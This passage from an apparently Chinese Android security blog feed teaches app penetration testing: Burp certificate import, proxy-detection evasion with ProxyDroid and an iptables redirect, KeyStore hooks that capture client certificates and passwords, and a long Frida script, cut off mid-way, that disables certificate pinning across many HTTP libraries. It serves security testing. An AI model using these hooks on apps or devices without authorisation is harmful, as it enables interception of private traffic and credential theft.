&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pyenv install 3.7.7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pyenv local 3.7.7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install frida&amp;#x3D;&amp;#x3D;12.8.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install frida-tools&amp;#x3D;&amp;#x3D;5.3.0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装objection&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install objection&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;objection -h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>APP测试常见问题总结</title>
    <link href="http://www.ol4three.com/2021/12/06/Android/APP%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://www.ol4three.com/2021/12/06/Android/APP%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2021-12-06T02:26:08.000Z</published>
    <updated>2021-12-29T03:19:00.844Z</updated>
    
    <content type="html"><![CDATA[<p>平常在进行APP测试的时候发现存在了很多问题，现在总结记录一下对应的知识，都在这遍文章下记录更新，老规矩先放一张图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206111758936.png" alt="image-20211206111758936"></p><a id="more"></a><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><h2 id="校验服务端HTTPS证书"><a href="#校验服务端HTTPS证书" class="headerlink" title="校验服务端HTTPS证书"></a>校验服务端HTTPS证书</h2><h3 id="导入Burp证书"><a href="#导入Burp证书" class="headerlink" title="导入Burp证书"></a>导入Burp证书</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206111913609.png" alt="image-20211206111913609"></p><p>导出之后使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push xxx.cer sdard</span><br></pre></td></tr></table></figure><p>然后在手机设置中找到安全，选择从SD卡安装证书</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206112049040.png" alt="image-20211206112049040" style="zoom: 33%;"><p>也可以开启代理，手机访问 ip:port 手动下载</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206112158670.png" alt="image-20211206112158670" style="zoom:50%;"><h2 id="HTTPS证书绑定"><a href="#HTTPS证书绑定" class="headerlink" title="HTTPS证书绑定"></a>HTTPS证书绑定</h2><p>只认定特定的HTTPS证书，其他证书全部拒绝连接</p><h3 id="ROOT设备安装Xposed后安装JustTurstMe"><a href="#ROOT设备安装Xposed后安装JustTurstMe" class="headerlink" title="ROOT设备安装Xposed后安装JustTurstMe"></a>ROOT设备安装Xposed后安装JustTurstMe</h3><p><strong>网上文章比较多可以自己搜索</strong></p><p>eg:<a href="https://zhuanlan.zhihu.com/p/36538699">https://zhuanlan.zhihu.com/p/36538699</a></p><h3 id="非ROOT设备使用VirtualXposed安装JustTrustMe"><a href="#非ROOT设备使用VirtualXposed安装JustTrustMe" class="headerlink" title="非ROOT设备使用VirtualXposed安装JustTrustMe"></a>非ROOT设备使用VirtualXposed安装JustTrustMe</h3><p>网上文章比较多可以自己搜索</p><p>eg：</p><p>VirtualXposed ：<a href="https://nsapps.cn/index.php/archives/23/">https://nsapps.cn/index.php/archives/23/</a></p><p>太极：<a href="https://bbs.pediy.com/thread-258036.htm">https://bbs.pediy.com/thread-258036.htm</a></p><h2 id="HTTPS双向证书绑定"><a href="#HTTPS双向证书绑定" class="headerlink" title="HTTPS双向证书绑定"></a>HTTPS双向证书绑定</h2><p>HOOK对应的证书加载函数，导入burp进行抓包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KeyStore.load.overload(&#39;java.security.KeyStore$LoadStoreParameter&#39;).implementation &#x3D; function (arg0) </span><br><span class="line">KeyStore.load.overload(&#39;java.io.InputStream&#39;, &#39;[C&#39;).implementation &#x3D; function (arg0, arg1) </span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220165122008.png" alt="image-20211220165122008"></p><p>可以看到成功hook到证书和密码，保存并导入<code>User options-TLS-Client TLS Certificates</code>即可</p><h2 id="检测代理"><a href="#检测代理" class="headerlink" title="检测代理"></a>检测代理</h2><p>很多APP中会设置如下检测：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String property &#x3D; System.getProperty(&quot;https.proxyHost&quot;);</span><br><span class="line">String property &#x3D; System.getProperty(&quot;https.proxyPort&quot;);</span><br><span class="line">if(!TextUtils.isEmpty(property))&#123;</span><br><span class="line">return new Proxy(Proxy,Type.HTTP, new InetSockerAddress(Property, Integer.parseInt(property2)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安装ProxyDroid"><a href="#安装ProxyDroid" class="headerlink" title="安装ProxyDroid"></a>安装ProxyDroid</h3><p>下载地址：<a href="https://proxydroid.cn.uptodown.com/android">https://proxydroid.cn.uptodown.com/android</a></p><p>打开之后授予root权限</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206114924471.png" alt="image-20211206114924471"></p><p>1). 对ProxyDroid进⾏配置（基本配置） </p><p>Auto Setting不勾选，我们⼿动进⾏配置。 </p><p>Host：输⼊代理服务器IP。 </p><p>Port：输⼊代理服务器端⼝。 </p><p>Proxy Type选择代理服务器提供服务类型：我们这⾥选择HTTP。 </p><p>Auto Connect为当2G/3G/WIFI⽹络开启时，⾃动开启代理服务。不勾选，我们⼿动启动，以获取最⼤灵活性。 </p><p>Bypass Addresses：相当于⿊名单列表，选择排除代理的IP范围，有需要的可以⾃⼰⼿动设置。 </p><p>2). 认证信息配置： </p><p>Enable Authentication：如果代理服务器需要账户、密码认证，勾选。 </p><p>User：认证账户名。 </p><p>Password：认证密码。 </p><p>NTLM Authentication：NTLM/ NTLM2，Windows早期的⼀种认证⽅式，不⽤勾选。 </p><p>3). 特征设置： </p><p>Global Proxy：⼀定要勾选，即为全局代理，代理所有App </p><p>Individual Proxy：单独代理所选App，勾选了第⼀条的不⽤管。 </p><p>Bypass Mode：勾选了代表第⼆条中所选App不代理，勾选了第⼀条的不⽤管。 </p><p>DNS Proxy：开启DNS代理。 </p><p>4). 通知设置： </p><p>Ringtone：选择通知铃声。 </p><p>Vibrate： </p><p>5). 都设置完成后，开启Proxy Switch即可。注意：如果使⽤ProxyDroid，⽆需在系统wifi处设置代理。</p><p>同理的</p><h3 id="使用Burp透明代理模式"><a href="#使用Burp透明代理模式" class="headerlink" title="使用Burp透明代理模式"></a>使用Burp透明代理模式</h3><p>我们使用Burp的透明代理模式，在BurpSuite中监听80和443这两个端口，并且将其设置为透明代理模式：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206151723408.png" alt="image-20211206151723408"></p><p>手机连接电脑，以下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">iptables -t nat -A OUTPUT -d 0.0.0.0&#x2F;0 -p tcp -j DNAT --to 172.20.10.3</span><br></pre></td></tr></table></figure><h3 id="逆向检测代理位置，Patch或者HOOK等"><a href="#逆向检测代理位置，Patch或者HOOK等" class="headerlink" title="逆向检测代理位置，Patch或者HOOK等"></a>逆向检测代理位置，Patch或者HOOK等</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;*</span><br><span class="line">    hook list:</span><br><span class="line">    1.SSLcontext</span><br><span class="line">    2.okhttp</span><br><span class="line">    3.webview</span><br><span class="line">    4.XUtils</span><br><span class="line">    5.httpclientandroidlib</span><br><span class="line">    6.JSSE</span><br><span class="line">    7.network\_security\_config (android 7.0+)</span><br><span class="line">    8.Apache Http client (support partly)</span><br><span class="line">    9.OpenSSLSocketImpl</span><br><span class="line">    10.TrustKit</span><br><span class="line">    11.Cronet</span><br><span class="line">    *&#x2F;</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Attempts to bypass SSL pinning implementations in a number of</span><br><span class="line">        &#x2F;&#x2F; ways. These include implementing a new TrustManager that will</span><br><span class="line">        &#x2F;&#x2F; accept any SSL certificate, overriding OkHTTP v3 check()</span><br><span class="line">        &#x2F;&#x2F; method etc.</span><br><span class="line">        var X509TrustManager &#x3D; Java.use(&#39;javax.net.ssl.X509TrustManager&#39;);</span><br><span class="line">        var HostnameVerifier &#x3D; Java.use(&#39;javax.net.ssl.HostnameVerifier&#39;);</span><br><span class="line">        var SSLContext &#x3D; Java.use(&#39;javax.net.ssl.SSLContext&#39;);</span><br><span class="line">        var quiet_output &#x3D; false;</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Helper method to honor the quiet flag.</span><br><span class="line">    </span><br><span class="line">        function quiet_send(data) &#123;</span><br><span class="line">    </span><br><span class="line">            if (quiet_output) &#123;</span><br><span class="line">    </span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            send(data)</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Implement a new TrustManager</span><br><span class="line">        &#x2F;&#x2F; ref: https:&#x2F;&#x2F;gist.github.com&#x2F;oleavr&#x2F;3ca67a173ff7d207c6b8c3b0ca65a9d8</span><br><span class="line">        &#x2F;&#x2F; Java.registerClass() is only supported on ART for now(201803). 所以android 4.4以下不兼容,4.4要切换成ART使用.</span><br><span class="line">        &#x2F;*</span><br><span class="line">    06-07 16:15:38.541 27021-27073&#x2F;mi.sslpinningdemo W&#x2F;System.err: java.lang.IllegalArgumentException: Required method checkServerTrusted(X509Certificate[], String, String, String) missing</span><br><span class="line">    06-07 16:15:38.542 27021-27073&#x2F;mi.sslpinningdemo W&#x2F;System.err:     at android.net.http.X509TrustManagerExtensions.&lt;init&gt;(X509TrustManagerExtensions.java:73)</span><br><span class="line">            at mi.ssl.MiPinningTrustManger.&lt;init&gt;(MiPinningTrustManger.java:61)</span><br><span class="line">    06-07 16:15:38.543 27021-27073&#x2F;mi.sslpinningdemo W&#x2F;System.err:     at mi.sslpinningdemo.OkHttpUtil.getSecPinningClient(OkHttpUtil.java:112)</span><br><span class="line">            at mi.sslpinningdemo.OkHttpUtil.get(OkHttpUtil.java:62)</span><br><span class="line">            at mi.sslpinningdemo.MainActivity$1$1.run(MainActivity.java:36)</span><br><span class="line">    *&#x2F;</span><br><span class="line">        var X509Certificate &#x3D; Java.use(&quot;java.security.cert.X509Certificate&quot;);</span><br><span class="line">        var TrustManager;</span><br><span class="line">        try &#123;</span><br><span class="line">            TrustManager &#x3D; Java.registerClass(&#123;</span><br><span class="line">                name: &#39;org.wooyun.TrustManager&#39;,</span><br><span class="line">                implements: [X509TrustManager],</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    checkClientTrusted: function(chain, authType) &#123;&#125;,</span><br><span class="line">                    checkServerTrusted: function(chain, authType) &#123;&#125;,</span><br><span class="line">                    getAcceptedIssuers: function() &#123;</span><br><span class="line">                        &#x2F;&#x2F; var certs &#x3D; [X509Certificate.$new()];</span><br><span class="line">                        &#x2F;&#x2F; return certs;</span><br><span class="line">                        return [];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;registerClass from X509TrustManager &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + e.message);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Prepare the TrustManagers array to pass to SSLContext.init()</span><br><span class="line">        var TrustManagers &#x3D; [TrustManager.$new()];</span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; Prepare a Empty SSLFactory</span><br><span class="line">            var TLS_SSLContext &#x3D; SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line">            TLS_SSLContext.init(null, TrustManagers, null);</span><br><span class="line">            var EmptySSLFactory &#x3D; TLS_SSLContext.getSocketFactory();</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(e.message);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        send(&#39;Custom, Empty TrustManager ready&#39;);</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Get a handle on the init() on the SSLContext class</span><br><span class="line">        var SSLContext_init &#x3D; SSLContext.init.overload(</span><br><span class="line">            &#39;[Ljavax.net.ssl.KeyManager;&#39;, &#39;[Ljavax.net.ssl.TrustManager;&#39;, &#39;java.security.SecureRandom&#39;);</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Override the init method, specifying our new TrustManager</span><br><span class="line">        SSLContext_init.implementation &#x3D; function(keyManager, trustManager, secureRandom) &#123;</span><br><span class="line">    </span><br><span class="line">            quiet_send(&#39;Overriding SSLContext.init() with the custom TrustManager&#39;);</span><br><span class="line">    </span><br><span class="line">            SSLContext_init.call(this, null, TrustManagers, null);</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** okhttp3.x unpinning ***&#x2F;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Wrap the logic in a try&#x2F;catch as not all applications will have</span><br><span class="line">        &#x2F;&#x2F; okhttp as part of the app.</span><br><span class="line">        try &#123;</span><br><span class="line">    </span><br><span class="line">            var CertificatePinner &#x3D; Java.use(&#39;okhttp3.CertificatePinner&#39;);</span><br><span class="line">    </span><br><span class="line">            quiet_send(&#39;OkHTTP 3.x Found&#39;);</span><br><span class="line">    </span><br><span class="line">            CertificatePinner.check.overload(&#39;java.lang.String&#39;, &#39;java.util.List&#39;).implementation &#x3D; function() &#123;</span><br><span class="line">    </span><br><span class="line">                quiet_send(&#39;OkHTTP 3.x check() called. Not throwing an exception.&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">    </span><br><span class="line">            &#x2F;&#x2F; If we dont have a ClassNotFoundException exception, raise the</span><br><span class="line">            &#x2F;&#x2F; problem encountered.</span><br><span class="line">            if (err.message.indexOf(&#39;ClassNotFoundException&#39;) &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">    </span><br><span class="line">                throw new Error(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Appcelerator Titanium PinningTrustManager</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Wrap the logic in a try&#x2F;catch as not all applications will have</span><br><span class="line">        &#x2F;&#x2F; appcelerator as part of the app.</span><br><span class="line">        try &#123;</span><br><span class="line">    </span><br><span class="line">            var PinningTrustManager &#x3D; Java.use(&#39;appcelerator.https.PinningTrustManager&#39;);</span><br><span class="line">    </span><br><span class="line">            send(&#39;Appcelerator Titanium Found&#39;);</span><br><span class="line">    </span><br><span class="line">            PinningTrustManager.checkServerTrusted.implementation &#x3D; function() &#123;</span><br><span class="line">    </span><br><span class="line">                quiet_send(&#39;Appcelerator checkServerTrusted() called. Not throwing an exception.&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">    </span><br><span class="line">            &#x2F;&#x2F; If we dont have a ClassNotFoundException exception, raise the</span><br><span class="line">            &#x2F;&#x2F; problem encountered.</span><br><span class="line">            if (err.message.indexOf(&#39;ClassNotFoundException&#39;) &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">    </span><br><span class="line">                throw new Error(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** okhttp unpinning ***&#x2F;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            var OkHttpClient &#x3D; Java.use(&quot;com.squareup.okhttp.OkHttpClient&quot;);</span><br><span class="line">            OkHttpClient.setCertificatePinner.implementation &#x3D; function(certificatePinner) &#123;</span><br><span class="line">                &#x2F;&#x2F; do nothing</span><br><span class="line">                quiet_send(&quot;OkHttpClient.setCertificatePinner Called!&quot;);</span><br><span class="line">                return this;</span><br><span class="line">            &#125;;</span><br><span class="line">    </span><br><span class="line">            &#x2F;&#x2F; Invalidate the certificate pinnet checks (if &quot;setCertificatePinner&quot; was called before the previous invalidation)</span><br><span class="line">            var CertificatePinner &#x3D; Java.use(&quot;com.squareup.okhttp.CertificatePinner&quot;);</span><br><span class="line">            CertificatePinner.check.overload(&#39;java.lang.String&#39;, &#39;[Ljava.security.cert.Certificate;&#39;).implementation &#x3D; function(p0, p1) &#123;</span><br><span class="line">                &#x2F;&#x2F; do nothing</span><br><span class="line">                quiet_send(&quot;okhttp Called! [Certificate]&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;;</span><br><span class="line">            CertificatePinner.check.overload(&#39;java.lang.String&#39;, &#39;java.util.List&#39;).implementation &#x3D; function(p0, p1) &#123;</span><br><span class="line">                &#x2F;&#x2F; do nothing</span><br><span class="line">                quiet_send(&quot;okhttp Called! [List]&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;com.squareup.okhttp not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** WebView Hooks ***&#x2F;</span><br><span class="line">    </span><br><span class="line">        &#x2F;* frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;webkit&#x2F;WebViewClient.java *&#x2F;</span><br><span class="line">        &#x2F;* public void onReceivedSslError(Webview, SslErrorHandler, SslError) *&#x2F;</span><br><span class="line">        var WebViewClient &#x3D; Java.use(&quot;android.webkit.WebViewClient&quot;);</span><br><span class="line">    </span><br><span class="line">        WebViewClient.onReceivedSslError.implementation &#x3D; function(webView, sslErrorHandler, sslError) &#123;</span><br><span class="line">            quiet_send(&quot;WebViewClient onReceivedSslError invoke&quot;);</span><br><span class="line">            &#x2F;&#x2F;执行proceed方法</span><br><span class="line">            sslErrorHandler.proceed();</span><br><span class="line">            return;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        WebViewClient.onReceivedError.overload(&#39;android.webkit.WebView&#39;, &#39;int&#39;, &#39;java.lang.String&#39;, &#39;java.lang.String&#39;).implementation &#x3D; function(a, b, c, d) &#123;</span><br><span class="line">            quiet_send(&quot;WebViewClient onReceivedError invoked&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        WebViewClient.onReceivedError.overload(&#39;android.webkit.WebView&#39;, &#39;android.webkit.WebResourceRequest&#39;, &#39;android.webkit.WebResourceError&#39;).implementation &#x3D; function() &#123;</span><br><span class="line">            quiet_send(&quot;WebViewClient onReceivedError invoked&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** JSSE Hooks ***&#x2F;</span><br><span class="line">    </span><br><span class="line">        &#x2F;* libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;javax&#x2F;net&#x2F;ssl&#x2F;TrustManagerFactory.java *&#x2F;</span><br><span class="line">        &#x2F;* public final TrustManager[] getTrustManager() *&#x2F;</span><br><span class="line">        &#x2F;* TrustManagerFactory.getTrustManagers maybe cause X509TrustManagerExtensions error  *&#x2F;</span><br><span class="line">        &#x2F;&#x2F; var TrustManagerFactory &#x3D; Java.use(&quot;javax.net.ssl.TrustManagerFactory&quot;);</span><br><span class="line">        &#x2F;&#x2F; TrustManagerFactory.getTrustManagers.implementation &#x3D; function()&#123;</span><br><span class="line">        &#x2F;&#x2F;     quiet_send(&quot;TrustManagerFactory getTrustManagers invoked&quot;);</span><br><span class="line">        &#x2F;&#x2F;     return TrustManagers;</span><br><span class="line">        &#x2F;&#x2F; &#125;</span><br><span class="line">    </span><br><span class="line">        var HttpsURLConnection &#x3D; Java.use(&quot;javax.net.ssl.HttpsURLConnection&quot;);</span><br><span class="line">        &#x2F;* libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;javax&#x2F;net&#x2F;ssl&#x2F;HttpsURLConnection.java *&#x2F;</span><br><span class="line">        &#x2F;* public void setDefaultHostnameVerifier(HostnameVerifier) *&#x2F;</span><br><span class="line">        HttpsURLConnection.setDefaultHostnameVerifier.implementation &#x3D; function(hostnameVerifier) &#123;</span><br><span class="line">            quiet_send(&quot;HttpsURLConnection.setDefaultHostnameVerifier invoked&quot;);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;* libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;javax&#x2F;net&#x2F;ssl&#x2F;HttpsURLConnection.java *&#x2F;</span><br><span class="line">        &#x2F;* public void setSSLSocketFactory(SSLSocketFactory) *&#x2F;</span><br><span class="line">        HttpsURLConnection.setSSLSocketFactory.implementation &#x3D; function(SSLSocketFactory) &#123;</span><br><span class="line">            quiet_send(&quot;HttpsURLConnection.setSSLSocketFactory invoked&quot;);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;* libcore&#x2F;luni&#x2F;src&#x2F;main&#x2F;java&#x2F;javax&#x2F;net&#x2F;ssl&#x2F;HttpsURLConnection.java *&#x2F;</span><br><span class="line">        &#x2F;* public void setHostnameVerifier(HostnameVerifier) *&#x2F;</span><br><span class="line">        HttpsURLConnection.setHostnameVerifier.implementation &#x3D; function(hostnameVerifier) &#123;</span><br><span class="line">            quiet_send(&quot;HttpsURLConnection.setHostnameVerifier invoked&quot;);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** Xutils3.x hooks ***&#x2F;</span><br><span class="line">        &#x2F;&#x2F;Implement a new HostnameVerifier</span><br><span class="line">        var TrustHostnameVerifier;</span><br><span class="line">        try &#123;</span><br><span class="line">            TrustHostnameVerifier &#x3D; Java.registerClass(&#123;</span><br><span class="line">                name: &#39;org.wooyun.TrustHostnameVerifier&#39;,</span><br><span class="line">                implements: [HostnameVerifier],</span><br><span class="line">                method: &#123;</span><br><span class="line">                    verify: function(hostname, session) &#123;</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    </span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            &#x2F;&#x2F;java.lang.ClassNotFoundException: Didn&#39;t find class &quot;org.wooyun.TrustHostnameVerifier&quot;</span><br><span class="line">            quiet_send(&quot;registerClass from hostnameVerifier &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + e.message);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            var RequestParams &#x3D; Java.use(&#39;org.xutils.http.RequestParams&#39;);</span><br><span class="line">            RequestParams.setSslSocketFactory.implementation &#x3D; function(sslSocketFactory) &#123;</span><br><span class="line">                sslSocketFactory &#x3D; EmptySSLFactory;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            RequestParams.setHostnameVerifier.implementation &#x3D; function(hostnameVerifier) &#123;</span><br><span class="line">                hostnameVerifier &#x3D; TrustHostnameVerifier.$new();</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;Xutils hooks not Found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;*** httpclientandroidlib Hooks ***&#x2F;</span><br><span class="line">        try &#123;</span><br><span class="line">            var AbstractVerifier &#x3D; Java.use(&quot;ch.boye.httpclientandroidlib.conn.ssl.AbstractVerifier&quot;);</span><br><span class="line">            AbstractVerifier.verify.overload(&#39;java.lang.String&#39;, &#39;[Ljava.lang.String&#39;, &#39;[Ljava.lang.String&#39;, &#39;boolean&#39;).implementation &#x3D; function() &#123;</span><br><span class="line">                quiet_send(&quot;httpclientandroidlib Hooks&quot;);</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;httpclientandroidlib Hooks not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        &#x2F;***</span><br><span class="line">    android 7.0+ network_security_config TrustManagerImpl hook</span><br><span class="line">    apache httpclient partly</span><br><span class="line">    ***&#x2F;</span><br><span class="line">        var TrustManagerImpl &#x3D; Java.use(&quot;com.android.org.conscrypt.TrustManagerImpl&quot;);</span><br><span class="line">        &#x2F;&#x2F; try &#123;</span><br><span class="line">        &#x2F;&#x2F;     var Arrays &#x3D; Java.use(&quot;java.util.Arrays&quot;);</span><br><span class="line">        &#x2F;&#x2F;     &#x2F;&#x2F;apache http client pinning maybe baypass</span><br><span class="line">        &#x2F;&#x2F;     &#x2F;&#x2F;https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;conscrypt&#x2F;blob&#x2F;c88f9f55a523f128f0e4dace76a34724bfa1e88c&#x2F;platform&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;conscrypt&#x2F;TrustManagerImpl.java#471</span><br><span class="line">        &#x2F;&#x2F;     TrustManagerImpl.checkTrusted.implementation &#x3D; function (chain, authType, session, parameters, authType) &#123;</span><br><span class="line">        &#x2F;&#x2F;         quiet_send(&quot;TrustManagerImpl checkTrusted called&quot;);</span><br><span class="line">        &#x2F;&#x2F;         &#x2F;&#x2F;Generics currently result in java.lang.Object</span><br><span class="line">        &#x2F;&#x2F;         return Arrays.asList(chain);</span><br><span class="line">        &#x2F;&#x2F;     &#125;</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        &#x2F;&#x2F; &#125; catch (e) &#123;</span><br><span class="line">        &#x2F;&#x2F;     quiet_send(&quot;TrustManagerImpl checkTrusted nout found&quot;);</span><br><span class="line">        &#x2F;&#x2F; &#125;</span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; Android 7+ TrustManagerImpl</span><br><span class="line">            TrustManagerImpl.verifyChain.implementation &#x3D; function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) &#123;</span><br><span class="line">                quiet_send(&quot;TrustManagerImpl verifyChain called&quot;);</span><br><span class="line">                &#x2F;&#x2F; Skip all the logic and just return the chain again :P</span><br><span class="line">                &#x2F;&#x2F;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;uk&#x2F;about-us&#x2F;newsroom-and-events&#x2F;blogs&#x2F;2017&#x2F;november&#x2F;bypassing-androids-network-security-configuration&#x2F;</span><br><span class="line">                &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;conscrypt&#x2F;blob&#x2F;c88f9f55a523f128f0e4dace76a34724bfa1e88c&#x2F;platform&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;conscrypt&#x2F;TrustManagerImpl.java#L650</span><br><span class="line">                return untrustedChain;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;TrustManagerImpl verifyChain nout found below 7.0&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; OpenSSLSocketImpl</span><br><span class="line">        try &#123;</span><br><span class="line">            var OpenSSLSocketImpl &#x3D; Java.use(&#39;com.android.org.conscrypt.OpenSSLSocketImpl&#39;);</span><br><span class="line">            OpenSSLSocketImpl.verifyCertificateChain.implementation &#x3D; function(certRefs, authMethod) &#123;</span><br><span class="line">                quiet_send(&#39;OpenSSLSocketImpl.verifyCertificateChain&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            quiet_send(&#39;OpenSSLSocketImpl pinning&#39;)</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            quiet_send(&#39;OpenSSLSocketImpl pinner not found&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; Trustkit</span><br><span class="line">        try &#123;</span><br><span class="line">            var Activity &#x3D; Java.use(&quot;com.datatheorem.android.trustkit.pinning.OkHostnameVerifier&quot;);</span><br><span class="line">            Activity.verify.overload(&#39;java.lang.String&#39;, &#39;javax.net.ssl.SSLSession&#39;).implementation &#x3D; function(str) &#123;</span><br><span class="line">                quiet_send(&#39;Trustkit.verify1: &#39; + str);</span><br><span class="line">                return true;</span><br><span class="line">            